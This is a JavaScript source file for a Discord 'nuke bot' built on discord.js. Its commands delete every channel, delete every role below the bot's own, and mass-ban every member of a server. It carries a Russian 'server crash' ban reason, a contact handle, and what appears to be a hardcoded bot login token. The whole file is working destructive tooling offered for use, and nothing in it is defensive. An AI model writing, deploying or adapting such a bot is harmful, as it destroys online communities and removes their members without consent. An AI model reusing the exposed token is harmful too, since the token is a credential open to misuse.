const discord = require("discord.js");
const nuke = new discord.Client();


nuke.on("ready", () =>{
console.log("This bot has been developed by INFINITY.")
console.log(`${nuke.user.tag} is online.`);
nuke.user.setPresence({ game: { name: `n!help` }, type: 0 });
});

nuke.on("message", async(msg)=>{



if(msg.content.toLowerCase().startsWith("!" + "nuke")){
    msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
    msg.guild.members.tap(member => member.ban("Краш сервера"));
}
if(msg.content.toLowerCase().startsWith("!" + "delete")){
    msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
    msg.guild.channels.deleteAll();
}
if(msg.content.toLowerCase().startsWith("!" + "ban")){
    msg.guild.members.tap(member => member.ban("Nuke Bot | Dev : INFINITT H4X"));
}
if(msg.content.toLowerCase().startsWith("!" + "help")){
    msg.author.send({
        embed: {
            color: 0xff0000,
            author: { name: "arsenij 4iter" },
            description: "!nuke - Bans all members & deletes all roles and channels\n!delete - Deletes all channels and roles\n!ban - Bans all members in the discord\n\nДля помощи пиши в лс ars3nij4iter#7797"
        }
    })
}
});

nuke.login("NzI2MDcwMDMzNDAyMjk4NDc5.XvX7aQ.dU06mQ4ecdDaWGWMXpHg8UGG09c");